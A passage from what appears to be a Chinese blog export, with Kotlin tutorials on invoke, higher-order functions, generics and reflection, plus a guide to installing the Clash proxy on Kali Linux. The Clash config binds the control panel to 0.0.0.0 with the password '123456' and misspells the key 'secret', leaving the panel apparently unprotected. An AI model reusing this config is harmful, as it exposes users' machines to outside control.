<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>&#123;</span><br><span class="line">    operator fun <span class="title function_">invoke</span><span class="params">(name:String)</span>&#123;</span><br><span class="line">        println(name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    People()(<span class="string">&quot;hzt&quot;</span>)</span><br><span class="line">    <span class="type">val</span> <span class="variable">hzt</span> <span class="operator">=</span> People()</span><br><span class="line">    hzt(<span class="string">&quot;SB&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上语法都是正确的，这就是invoke约定。<br>这也可以解释为什么lambda函数可以直接在后头加个小括号直接调用。因为lambda函数都会转化为Function类。然后里面会有一个内置的方法invoke会存储你的lambda函数体。<br>而invoke用到的地方，大大优化了DSL，如下图：<br><img src="https://image.zfxt.top/hexo-blog/kotlin(DSL)-2023-07-05-56-02.png"></p>
<h3 id="infix声明"><a href="#infix声明" class="headerlink" title="infix声明"></a>infix声明</h3><p>infix表示它可以使用中缀调用。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kali中使用clash作为代理</title>
    <url>/posts/6d6854ee/</url>
    <content><![CDATA[<h2 id="一般的桌面级OS，如ubuntu，centos。他们都会有图形化的代理配置如下图所示。"><a href="#一般的桌面级OS，如ubuntu，centos。他们都会有图形化的代理配置如下图所示。" class="headerlink" title="一般的桌面级OS，如ubuntu，centos。他们都会有图形化的代理配置如下图所示。"></a>一般的桌面级OS，如<strong>ubuntu</strong>，<strong>centos</strong>。他们都会有图形化的代理配置如下图所示。<img src="https://image.zfxt.top/hexo-blog/kali%E4%B8%AD%E4%BD%BF%E7%94%A8clash%E4%BD%9C%E4%B8%BA%E4%BB%A3%E7%90%86-2023-06-17-01-09.png"></h2><p>但是，在kali中他并没有这个配置。因此你需要通过命令行界面去配置代理。这里以clash为例<br><strong>clash</strong><br>clash是一个广泛使用的代理工具，可以跨平台使用，兼容windows，linux，mac。</p>
<h1 id="clash的安装"><a href="#clash的安装" class="headerlink" title="clash的安装"></a>clash的安装</h1><p>你可以在这个链接中获得clash的<a href="https://github.com/Dreamacro/clash/releases/tag/v1.16.0" title="clash">最新版本</a><br>这里是dashboard的<a href="https://github.com/haishanh/yacd/releases">发行版本</a></p>
<p>这里演示在linux下安装clash的过程</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p><em>这次演示使用clash+dashboard作为代理服务并配合机场使用</em></p>
<hr>
<h3 id="dashboard"><a href="#dashboard" class="headerlink" title="dashboard"></a>dashboard</h3><p><em><strong>dashboard是一个ui界面，用来管理clash，他更多用于云服务器，一般默认为9090端口，可以从外界访问，从而控制代理服务。</strong></em><br>  先在用户目录下安装一个clash文件夹，并进入到其中</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> clash &amp;&amp; <span class="built_in">cd</span> clash</span><br></pre></td></tr></table></figure>
<p>  然后再目录下，把机场给的config.yaml下载下来，可以使用wget</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget <span class="string">&quot;机场给你的订阅链接&quot;</span> -O config.yaml</span><br></pre></td></tr></table></figure>
<p>然后从github上获取clash和dashboard的二进制文件。</p>
<blockquote>
<p>建议从github上获取最新的链接，因为在某个版本前的clash已经出现了漏洞问题</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://github.com/Dreamacro/clash/releases/download/v1.11.12/clash-linux-amd64-v1.11.12.gz</span><br><span class="line">wget https://github.com/haishanh/yacd/releases/download/v0.3.7/yacd.tar.xz</span><br></pre></td></tr></table></figure>


<hr>
<p>然后解压两个文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gzip -d clash-linux-amd64-v1.11.12.gz</span><br><span class="line">tar -xvf yacd.tar.xz &amp;&amp; <span class="built_in">mv</span> public dashboard</span><br></pre></td></tr></table></figure>
<p>给clash添加执行权限</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x clash</span><br></pre></td></tr></table></figure>
<p>编辑config.yaml配置</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">port: 7890</span><br><span class="line">socks-port: 7891</span><br><span class="line">allow-lan: <span class="literal">true</span></span><br><span class="line">mode: Rule</span><br><span class="line">log-level: info</span><br><span class="line">secert: 123456 // 增加这一行, 如果你希望你的clash</span><br><span class="line">web要密码访问可以在这块配置密码, 如果不需要直接注释掉即可</span><br><span class="line">external-ui: dashboard // 增加这一行</span><br><span class="line">external-controller: 0.0.0.0:9090</span><br></pre></td></tr></table></figure>
<p>然后执行<code>./clash -d .</code>即可运行起来。</p>
<hr>
<p>然后配置代理服务。</p>
<ul>
<li>如果只是暂时使用<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">```shell</span><br><span class="line">  <span class="built_in">export</span> https_proxy=http://127.0.0.1:7890</span><br><span class="line">  <span class="built_in">export</span> http_proxy=http://127.0.0.1:7890</span><br><span class="line">  <span class="built_in">export</span> all_proxy=socks5://127.0.0.1:7891</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 也可以配置到~./bashrc中</span><br><span class="line">    然后source ./bashrc</span><br><span class="line">需要关闭代理可以</span><br><span class="line">```sh</span><br><span class="line">unset http_proxy</span><br><span class="line">unset https_proxy</span><br><span class="line">unset all_proxy</span><br></pre></td></tr></table></figure>
如果你没有办法下载到以上配置项，这里给你提供一个压缩包，你解压后，赋予权限，然后带上机场给你的配置项就可以使用了。<a href="https://sakuradrive.com/f/kk7bcW/clash.zip">clash一键包</a></li>
</ul>
<h2 id="服务器linux"><a href="#服务器linux" class="headerlink" title="服务器linux"></a>服务器linux</h2><p>如果是在服务器上进行部署，那么以上的配置已经足够，因为你的服务器全天不关机，不需要去考虑是否需要为clash配置一个守护进程。<br>更多的内容可以查看我的另一篇文章<a href="https://zfxt.top/index.php/archives/4/">配置clash快速启动和关闭</a></p>
<h2 id="桌面级linux"><a href="#桌面级linux" class="headerlink" title="桌面级linux"></a>桌面级linux</h2><p>桌面级比如我正在使用的kali，因为他不能便携的使用代理服务。因此我将会推荐使用以下的配置。</p>
<h3 id="首先需要为clash配置一个守护进程，让他可以简单的启动以及开机自启动"><a href="#首先需要为clash配置一个守护进程，让他可以简单的启动以及开机自启动" class="headerlink" title="首先需要为clash配置一个守护进程，让他可以简单的启动以及开机自启动"></a>首先需要为clash配置一个守护进程，让他可以简单的启动以及开机自启动</h3><p>配置启动项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/systemd/system/clash.service</span><br></pre></td></tr></table></figure>
<p>然后填入以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">复制</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Clash service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=louis（你的用户名）</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下面这个启动项填三个参数，第一个是你的文件位置，然后是-d，最后是文件所在的目录。</span></span><br><span class="line">ExecStart=/home/zfxt/clash/clash -d /home/zfxt/clash</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartPreventExitStatus=23</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<p><strong>加载服务</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable clash</span><br><span class="line">systemctl start clash</span><br><span class="line">systemctl status clash</span><br></pre></td></tr></table></figure>
<p>然后在<code>/etc/enviroment</code>添加代理的配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export https_proxy=http://127.0.0.1:7890</span><br><span class="line">export http_proxy=http://127.0.0.1:7890</span><br><span class="line">export all_proxy=socks5://127.0.0.1:7891</span><br></pre></td></tr></table></figure>
<p>然后<code>source /etc/enviroment</code>即可使用代理了</p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>clash</tag>
      </tags>
  </entry>
  <entry>
    <title>koltin(高阶函数)</title>
    <url>/posts/9e2ac398/</url>
    <content><![CDATA[<h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>高阶函数就是以另一个函数为参数，或者返回值为函数的函数。例如常用的filter,map,with等都是高阶函数</p>
<h3 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h3><p><img src="https://image.zfxt.top/hexo-blog/koltin(%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0)-2023-07-09-13-06.png"></p>
<ol>
<li>函数类型必须显示的表示出来，如Unit在普通函数中可以隐藏。但是在函数类型的声明中，必须完整的写出来。</li>
<li>当你已经声明了函数类型后，你再写lambda函数，就可以省略掉lambda函数里的参数类型，而直接写他的参数名。</li>
<li>同样的，函数类型也有可空的。但是有两点区分 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">val testNull1: (Int) -&gt; Int? = &#123; <span class="literal">null</span> &#125;</span><br><span class="line">val testNull2: ((Int) -&gt; Int)? = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">val testError: (Int) -&gt; Nothing = &#123;</span><br><span class="line">	<span class="keyword">throw</span> Exception(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
一个是返回类型的可空，一个是函数类型的可空。</li>
</ol>
<h3 id="在java中使用函数类"><a href="#在java中使用函数类" class="headerlink" title="在java中使用函数类"></a>在java中使用函数类</h3><p>其背后原理为：函数类型在编译后会被声明为一个普通的接口，一个函数类型的变量就是FunctionN的一个实现。kolitn定义了一系列接口，包括不同数量的参数，Function0<R>(没有参数的函数)、 Function1&lt;P1,R&gt;(一个参数的函数)，等等。每个接口都实现一个invoke方法，这个方法就是lambda函数的函数体</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//java8后的版本</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">calculate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculate</span>((Integer a, Integer b) -&gt; a - b);</span><br><span class="line">        System.out.println(calculate.calculate(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//java8以前</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">calculate1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculate</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Function2</span>&lt;Integer, Integer, Integer&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Integer <span class="title function_">invoke</span><span class="params">(Integer integer, Integer integer2)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> integer + integer2;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line">        System.out.println(calculate1.calculate(<span class="number">1</span>, <span class="number">2</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>函数类型的参数也可以设置一个默认值</li>
<li>函数也可以返回一个函数，通常用于返回一个常用的逻辑。</li>
<li>也可以通过lambda函数实现合并提取出重复代码，简化整体。</li>
</ul>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(泛型)</title>
    <url>/posts/38e6998/</url>
    <content><![CDATA[<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><ol>
<li>泛型允许你定义带类型形参的类型。</li>
<li>但是当这个类型的实例被创建出来时，类型形参将会被替换为类型实参的具体类型。即<code>T</code>,<code>E</code>这样的类型形参会被替换为具体的<code>String</code>，<code>Int</code>之类的。</li>
<li>此外，kotlin的编译器可以根据你给定的类型自动推导出所需的类型实参。但是如果你没有给定相关的类型，即编译器无法判断。如你只给定了一个空数组。此时你必须显式的说明你的类型实参是什么(就是必须写清楚&lt;&gt;中的参数类型)<blockquote>
<p>注意，因为java中，泛型是在1.6后的版本才被引入。所以为了和老版的java兼容，他允许使用没有类型参数的泛型类型–所谓的原生态类型。而kotlin不然，他必须声明泛型的类型。</p>
</blockquote>
</li>
</ol>
<h3 id="泛型类型和属性"><a href="#泛型类型和属性" class="headerlink" title="泛型类型和属性"></a>泛型类型和属性</h3><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-08-56-37.png"><br>如图所示，你必须可以接受一个类型实参进入，用来代替T。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun &lt;T&gt; testFanxing(x: T): T &#123;</span><br><span class="line">    println( x.hashCode())</span><br><span class="line">    <span class="keyword">return</span> x as T</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他不仅可以适用与函数，也可以适用于属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">val &lt;T&gt; List&lt;T&gt;.lastIndex:T</span><br><span class="line">    <span class="title function_">get</span><span class="params">()</span> = <span class="number">1</span> as T</span><br></pre></td></tr></table></figure>
<p>但是如果作为非扩展的属性，他将意义不大，因此kotlin编译器拒绝了对普通属性的泛型化。只有扩展属性才能泛型化。</p>
<p>对于类也是不必多言，他同样可以适用于泛型。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-22-30-45.png"></p>
<h3 id="类型参数约束"><a href="#类型参数约束" class="headerlink" title="类型参数约束"></a>类型参数约束</h3><p>我们可以约束泛型的范围，有两种方法：</p>
<ol>
<li>为泛型添加上界约束<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-07-07-43.png"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun &lt;T:Number&gt; sum(a:T, b:T)&#123;</span><br><span class="line">    println(a)</span><br><span class="line">    println(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这样子泛型直接为数字类型。<br>还有其他的例子：<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-21-06-28.png"><br>如果要限定多个参数类型，需要使用where关键字<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun &lt;T&gt; sum(a:T, b:T) where T:Appendable,T:Number&#123;</span><br><span class="line">    println(a)</span><br><span class="line">    println(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="运行时泛型：擦除和实化类性参数"><a href="#运行时泛型：擦除和实化类性参数" class="headerlink" title="运行时泛型：擦除和实化类性参数"></a>运行时泛型：擦除和实化类性参数</h2><p>JVM上的泛型都是通过类型擦除实现的，就是说泛型类实例的类型实参在运行时是不保留的。</p>
<h3 id="运行时泛型"><a href="#运行时泛型" class="headerlink" title="运行时泛型"></a>运行时泛型</h3><p>和java一样，kotlin的泛型在运行时也会被擦除。这意味着即便你创建一个List<String>的类，在运行时也只能看到List而已。你无法判断他具体是什么类型，只能判断他是一个List。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-17-32-57.png"><br>如果你尝试去判断一个list类具体是什么类型。他只会抛出错误，“无法检查一个被擦除的类”<br><strong>擦除也是有好处的，它可以降低应用程序的内存用量，因为保存在内存的类型信息更少了</strong></p>
<p>如果要判断一个类是不是list而不是set或其他的集合类，可以使用星号投影来做检查：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span>(list is List&lt;*&gt;)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意，在 as as ？转换中仍然可以使用一般的泛型类型 但是如果该类有正确的基础类型但类型实参是错误的，转换也不会失败，因为在运行时转换发生的时候类型实参是未知的。因此，这样的转换会导致编译器发出“unchecked cast ”（未受检转换）的警告。这仅仅是一个警告，你仍然可以继续使用这个值，就当它拥有必要的类型，如下所示。</p>
</blockquote>
<p>也就是说，如果你要把set类型强行转化为list&lt;*&gt;类型，那么他的基础类型转化就是错误的，他会直接抛出一个IllegalArgumentException。表示参数错误。因为他也无法判断你的类型实参是否正确。而如果你是从list<String>转化为list<Int>那么他将会抛出ClassCastException。</p>
<h3 id="带实化类型参数的函数"><a href="#带实化类型参数的函数" class="headerlink" title="带实化类型参数的函数"></a>带实化类型参数的函数</h3><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-10-04-48.png"><br>在一般的情况下，我们的类型实参都会被JVM擦除掉，而这只有一种情况可以避免：内联函数。内联函数可以实化类型参数。<br>inline函数的作用此时被挖掘了出来，他将不止能够提高lambda函数的运行效率，也可以把参数类型实化。只需要</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inline fun&lt;reified T&gt; isA(value: Any)=value is T</span><br></pre></td></tr></table></figure>
<p>添加inline和refied关键词就可以。<br>然后他就可以正常检查数据类型是否正确。<br>注意，带 reified 类型参数的 inline 函数不能在 Java 代码中调用。</p>
<h3 id="实化类型参数可以代替引用类"><a href="#实化类型参数可以代替引用类" class="headerlink" title="实化类型参数可以代替引用类"></a>实化类型参数可以代替引用类</h3><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-15-27-16.png"><br>如果是使用普通的类，那么他就无法提取T的反射。只有实化才能使用。</p>
<p>实化类型参数的限制<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-20-46-51.png"></p>
<h2 id="变型、泛型和子类型化"><a href="#变型、泛型和子类型化" class="headerlink" title="变型、泛型和子类型化"></a>变型、泛型和子类型化</h2><p>为什么会出现变型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//只读</span></span><br><span class="line">    <span class="type">val</span> <span class="variable">list</span> <span class="operator">=</span> listOf(<span class="string">&quot;abc&quot;</span>,<span class="string">&quot;123&quot;</span>)</span><br><span class="line">    fun <span class="title function_">listOnlyRead</span><span class="params">(list: List&lt;Any&gt;)</span>&#123;</span><br><span class="line">        println(list.joinToString())</span><br><span class="line">    &#125;</span><br><span class="line">    listOnlyRead(list)</span><br><span class="line"><span class="comment">//可变</span></span><br><span class="line">    <span class="type">val</span> <span class="variable">mutableList</span> <span class="operator">=</span> mutableListOf(<span class="string">&quot;abc&quot;</span>,<span class="string">&quot;123&quot;</span>)</span><br><span class="line">    fun <span class="title function_">listChange</span><span class="params">(list: MutableList&lt;Any&gt;)</span>&#123;</span><br><span class="line">        list.add(<span class="number">12</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    listChange(mutableList)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于只读的list集合，我们把一个List<String>的变量传递给List<Any>也是安全的。但是如果我们传递的是可变的，那么他将会出现异常，因为我们给一个Stirng类型的list添加int类型的数据。<br>当然，这个错误已经被编译器捕获，他不会让我们编译成功。<br>因此，才会有对变型的讨论，避免出现类型转换后的报错问题。</p>
<h3 id="类，类型"><a href="#类，类型" class="headerlink" title="类，类型"></a>类，类型</h3><p>类的名称可以直接当作类型使用。例如，如果你这样写var x:String,就是声明了一个可以保存String类的实例的变量。但是注意，同样的类名称也可以用来声明可空类型var x:String?。这意味着每一个Kotlin类都可以用于构造至少两种类型。泛型类的情况就变得更复杂了。要得到一个合法的类型，需要用一个作为类型实参的具体类型替换（泛型）类的类型形参。List不是一个类型（它是一个类)，但是下面列举出来的所有替代品都是合法的类型：<code>List&lt;Int&gt;</code>,<code>List&lt;String?&gt;</code>,<code>List&lt;List&lt;String&gt;&gt;</code>,等。每一个泛型类都可能生成潜在的无限数量的类型。</p>
<p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-21-43-35.png"><br>简单的情况下，子类型和子类本质上意味着一样的事物。例如，Int类是Number的子类，因此Int类型是Number类型的子类型。如果一个类实现了一个接口，它的类型就是该接口类型的子类型：String是CharSequence的子类型。<br>如果对于任意两种类型 A,B。<code>MutableList&lt;A&gt;</code>既不是 <code>MutableList&lt;B&gt;</code> 的子类型也不是它的超类型，它被称为在该类型参数上是不变型的。Java 中所有的类都是不变型的</p>
<h3 id="协变，逆变"><a href="#协变，逆变" class="headerlink" title="协变，逆变"></a>协变，逆变</h3><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-01-11-21.png"><br>使用out关键词约束就只能放在out位置上，同理in也一样。</p>
<ol>
<li>协变：<br>如果A是B的子类型，那么 <code>Producer&lt;A&gt;</code>就是<br><code>Producer&lt;B&gt;</code>的子类型。我们说子类型化被保留了 。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-02-40-13.png"></li>
</ol>
<ul>
<li>子类型化会被保留（ <code>Producer&lt;Cat&gt;</code>是 <code>Producer &lt;Anirnal&gt;</code> 的子类型）,也就是可以输出为子类型</li>
<li>只能用在 out 位置</li>
</ul>
<ol start="2">
<li>逆变：</li>
</ol>
<p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-06-03-55.png"><br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-20-33-14.png"></p>
<blockquote>
<p>更多关键内容查看该<a href="https://xie.infoq.cn/article/6e5a800f57b36d36dbd70b672">文章</a></p>
</blockquote>
<h3 id="点变型"><a href="#点变型" class="headerlink" title="点变型"></a>点变型</h3><p>使用out，in这些关键词就是声明点变型。<br>但是有些不同的地方就在于，使用了点变型的都被称为<strong>类型投影</strong>，他们不是一个常规的类，而是一个可以返回类型是泛型参数类型的方法。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-19-37-40.png"><br>例如你选择了一个Any的泛型类型，那么这个他最多只能使用Any的方法，至于他的儿子Int，String的特有方法都不能使用。</p>
<h3 id="星号投影"><a href="#星号投影" class="headerlink" title="星号投影"></a>星号投影</h3><p>当类型实参的信息并不重要的时候，可以使用星号投影的语法：不需要使用任何在签名中引用类型参数的方法，或者只是读取数据而不关心它的具体类型。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%9B%E5%9E%8B)-2023-07-03-43-23.png"></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(注解和反射)</title>
    <url>/posts/6fc70aaa/</url>
    <content><![CDATA[<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><h3 id="使用注解"><a href="#使用注解" class="headerlink" title="使用注解"></a>使用注解</h3><p>使用注解只需要把@符作为名字的前缀，并放在需要注解的代码元素前面。</p>
<ul>
<li><code>@Test</code><br>是一个好用的注解,他可以用来测试一个方法的执行。</li>
<li><code>@Deprecated</code><br>这个注解的作用是，声明那些方法已经被弃用，淘汰了。它可以与IDE一起使用。在kotlin中，他还使用了replaceWith参数加强了他。可以提供一个替代者，并且转移参数。（一条不推荐使用的消息，和一个替代者的模式）<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84)-2023-07-05-48-53.png"></li>
</ul>
<h3 id="注解能够拥有的参数"><a href="#注解能够拥有的参数" class="headerlink" title="注解能够拥有的参数"></a>注解能够拥有的参数</h3><p>基本数据类型，字符串，枚举，类引用，其他注解。<br>他与java的不同：</p>
<ul>
<li>要把一个类指定为注解实参，必须在类后面加上::class，表示这个类的反射。</li>
<li>要把另一个注解添加为实参，必须强调注解前的@。</li>
<li>要把一个数组指定为实参，必须使用arrayOf函数</li>
<li>注解使用的参数必须是已知的。也就是常数</li>
</ul>
<h3 id="注解目标"><a href="#注解目标" class="headerlink" title="注解目标"></a>注解目标</h3><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84)-2023-07-02-22-08.png"><br>因为一个kotlin的声明往往对应着java的多个声明。如一个属性，java中只会是一个普通的字段。而kotlin中还包括set，get方法和一些隐藏的参数。所以使用点目标可以具体确定是那个代码接受注解。<br>Kotlin 支持的使用点目标的完整列表如下<br>• property一 Java 的注解不能应用这种使用 目标<br>• field 一 为属性生成的字段<br>• get 一一属性的 getter<br>• set 一一  属性的 setter<br>• receiver 一一 扩展函数或者扩展属性的接收者参数。<br>• param一一构造方法的参数。<br>• setparam一一属性 setter 的参数<br>• delegate 为委托属性存储委托实例的字段<br>• file 一一包含在文件中声明的顶层函数和属性的类。</p>
<p><strong>用注解控制生成的javaAPI</strong><br>可以通过注解改变kotlin默认生成的javaAPI。而自己设定<br>@JvmName–改变由kotlin生成的java方法或字段<br>@JvmStatic–将方法或属性暴露为java中的静态内容<br>@JvmOverloads–将kotlin编译器中带默认参数值的方法或构造方法自动重载为多个方法<br>@JvmField–把一个属性暴露为一个没有访问器的公有java字段</p>
<h3 id="声明注解"><a href="#声明注解" class="headerlink" title="声明注解"></a>声明注解</h3><p>只需在类前添加annotation<br>也就是<code>annotation class</code>，而且kotlin编译器禁止注解类有实体。也就是不能有大括号。只能有部分参数。<br>对于kotlin的注解，他有一个特殊的属性：name，他与java中注解的一个属性类似：value。这个属性不用强制写key-value的模式。而是可以直接写值。</p>
<h3 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h3><p>顾名思义，即使可以添加在注解类上的注解，他的作用是用来控制一个注解类的使用。<br>最常用的就是@Target。他可以用来控制注解能用在哪些位置上。比如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(AnnotationTarget.PROPERTY)</span></span><br><span class="line">annotation <span class="keyword">class</span> <span class="title class_">MyAnnotation</span></span><br></pre></td></tr></table></figure>
<p>这个注解就只用使用在属性Property上。相应的还有<code>类、文件、函数、属性、属性访 所有 表达式 等等</code>。</p>
<blockquote>
<p>对于java，他不能使用property的属性。所以你必须在声明一个field才能供java使用。</p>
</blockquote>
<p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84)-2023-07-10-14-05.png"></p>
<p>使用类作为注解的参数，通常是使用他的反射，而且他还可以使用泛型类，包括他的投影</p>
<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>一种在运行时动态的访问对象属性和方法的方式。而不需要提前知道这些属性是什么。<br>通常你访问一个对象的方法或属性时，程序的源代码会引用一个具体的声明，编译器会静态的解析这个引用，并确保它是存在的。但有时候，你需要编写能够使用任意类型的对象的代码，或者只能在运行时才能确定要访问的方法和属性。JSON序列化就是这样的。</p>
<h3 id="两种反射"><a href="#两种反射" class="headerlink" title="两种反射"></a>两种反射</h3><ol>
<li>java的反射。定义在<code>java.lang.reflect</code>中，因为kotlin会被编译为字节码，java反射完全支持它，这意味着使用了反射API的java库完全兼容kotlin代码。</li>
<li>kotlin的反射。定义在<code>kotlin.reflect</code>中，他让你访问一些java中不存在的概念，如属性和空类型。<strong>但有些情况你任然会去使用java的反射</strong><blockquote>
<p>kotlin的反射没有仅限于kotlin类，而是使用同样的APi访问任何用JVM语言编译成的类。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84)-2023-07-21-51-36.png"></p>
</blockquote>
</li>
</ol>
<h3 id="kotlin反射API：KClass，KCallable-KFunction-KProperty"><a href="#kotlin反射API：KClass，KCallable-KFunction-KProperty" class="headerlink" title="kotlin反射API：KClass，KCallable,KFunction,KProperty"></a>kotlin反射API：KClass，KCallable,KFunction,KProperty</h3><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84)-2023-07-21-23-56.png"><br>所有反射类的继承关系如上</p>
<ol>
<li><p>KClass<br>既可以表示类，也可以表示所有对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(val name: String, val age: Int) : Animal() &#123;</span><br><span class="line">       fun <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">           println(<span class="string">&quot;name:$name,age:$age&quot;</span>)</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">val</span> <span class="variable">people</span> <span class="operator">=</span> People(<span class="string">&quot;小明&quot;</span>, <span class="number">18</span>)</span><br><span class="line">   <span class="type">val</span> <span class="variable">kclass</span> <span class="operator">=</span> people.javaClass.kotlin</span><br><span class="line">   <span class="title function_">println</span><span class="params">(kclass.simpleName)</span></span><br><span class="line">   kclass.members.forEach &#123;</span><br><span class="line">       println(it.name)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>你可以通过获取反射然后得到他的所有成员和类名，还有更多方便的方法，这里不细说</p>
</li>
